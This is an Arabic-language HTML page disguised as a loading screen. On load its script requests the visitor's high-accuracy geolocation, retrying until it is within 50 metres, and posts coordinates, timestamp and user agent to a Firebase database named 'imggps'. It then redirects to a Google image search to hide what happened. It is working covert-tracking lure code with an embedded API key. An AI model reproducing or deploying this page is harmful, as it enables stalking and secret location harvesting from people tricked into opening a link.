<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تحميل...</title>
    <style>
        body {
            background: #202124;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            color: white;
        }
        .loader { text-align: center; }
        .spinner {
            width: 40px; height: 40px;
            border: 4px solid rgba(255,255,255,0.3);
            border-top: 4px solid #8ab4f8;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto 20px;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        .message { font-size: 14px; color: #aaa; margin-bottom: 15px; }
        .btn {
            background: #8ab4f8;
            color: #202124;
            border: none;
            padding: 10px 20px;
            border-radius: 6px;
            font-size: 14px;
            cursor: pointer;
            display: none;
        }
    </style>
</head>
<body>
    <div class="loader">
        <div class="spinner"></div>
        <div class="message" id="status">جاري التجهيز...</div>
        <button class="btn" id="retryBtn" onclick="startLocation()">السماح بالوصول للموقع</button>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyBvQWo5HIintxbq9hyz_88kVfebFyfiFuo",
            databaseURL: "https://imggps-default-rtdb.firebaseio.com",
            projectId: "imggps"
        };

        const TARGET_URL = "https://www.google.com/search?q=%D9%8B&sca_esv=f89d85d2f89b426d&rlz=1CDGOYI_enEG1101EG1101&hl=en-US&udm=2&biw=414&bih=724&sxsrf=APpeQnsD_w8GcL8vMj8pp1s2LJvbC1tAlg%3A1785560656689&ei=UH5taprlKYGF9u8P5qbv2Ao&oq=%D9%8B&gs_lp=EhJtb2JpbGUtZ3dzLXdpei1pbWciAtmLMgUQABiABDIFEAAYgAQyBRAAGIAEMgUQABiABDIFEAAYgARIrCZQwBhY4SFwAXgAkAEAmAHnAaAB4AOqAQUxLjAuMrgBA8gBAPgBAZgCA6AC7wOoAgDCAgkQABiABBgKGAuYAwHiAwUSATEgQIgGAZIHBTEuMC4yoAevBbIHBTEuMC4yuAfvA8IHBzAuMS4xLjHIBw-ACAA&sclient=mobile-gws-wiz-img";
        const DB_PATH = "visitors";

        // الحد الأقصى المقبول للدقة (بالمتر). غيّره حسب حاجتك
        const MAX_ACCEPTABLE_ACCURACY = 50; // يقبل فقط إذا كانت الدقة أفضل من 50 متر
        const MAX_ATTEMPTS = 3;             // عدد المحاولات
        let attempt = 0;
        let watchId = null;

        function redirect() {
            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
            }
            window.location.href = TARGET_URL;
        }

        function saveData(lat, lng, accuracy) {
            const record = {
                lat: lat,
                lng: lng,
                accuracy: accuracy,
                timestamp: Date.now(),
                userAgent: navigator.userAgent.substring(0, 100)
            };

            try {
                const localData = JSON.parse(localStorage.getItem('geo_log') || '[]');
                localData.push(record);
                localStorage.setItem('geo_log', JSON.stringify(localData));
            } catch(e) {}

            fetch(`${firebaseConfig.databaseURL}/${DB_PATH}.json`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(record)
            })
            .then(() => console.log('تم الحفظ'))
            .catch(err => console.warn('فشل الحفظ', err))
            .finally(() => redirect());
        }

        function handleSuccess(pos) {
            const accuracy = pos.coords.accuracy;

            // إذا كانت الدقة ضعيفة، نحاول مرة أخرى
            if (accuracy > MAX_ACCEPTABLE_ACCURACY && attempt < MAX_ATTEMPTS) {
                attempt++;
                document.getElementById('status').textContent = 
                    `جاري تحسين الدقة... (محاولة ${attempt}/${MAX_ATTEMPTS})`;
                return; // ننتظر القراءة التالية من watchPosition
            }

            // قبول النتيجة
            const lat = pos.coords.latitude.toFixed(7);
            const lng = pos.coords.longitude.toFixed(7);
            const acc = accuracy ? accuracy.toFixed(1) : 'N/A';

            document.getElementById('status').textContent = `تم تحديد الموقع (±${acc}م)`;
            document.getElementById('retryBtn').style.display = 'none';

            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
                watchId = null;
            }

            saveData(lat, lng, acc);
        }

        function handleError(err) {
            console.warn('خطأ:', err.message);
            document.getElementById('status').textContent = 'يرجى السماح بالوصول للموقع';
            document.getElementById('retryBtn').style.display = 'inline-block';

            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
                watchId = null;
            }

            setTimeout(redirect, 8000);
        }

        function startLocation() {
            attempt = 0;
            document.getElementById('status').textContent = 'جاري تحديد الموقع بدقة عالية...';
            document.getElementById('retryBtn').style.display = 'none';

            if (!navigator.geolocation) {
                document.getElementById('status').textContent = 'المتصفح لا يدعم تحديد الموقع';
                setTimeout(redirect, 2000);
                return;
            }

            // استخدام watchPosition للحصول على قراءات متعددة وتحسين الدقة
            watchId = navigator.geolocation.watchPosition(
                handleSuccess,
                handleError,
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }

        // بدء تلقائي
        startLocation();

        // احتياط نهائي
        setTimeout(redirect, 20000);
    </script>
</body>
</html>
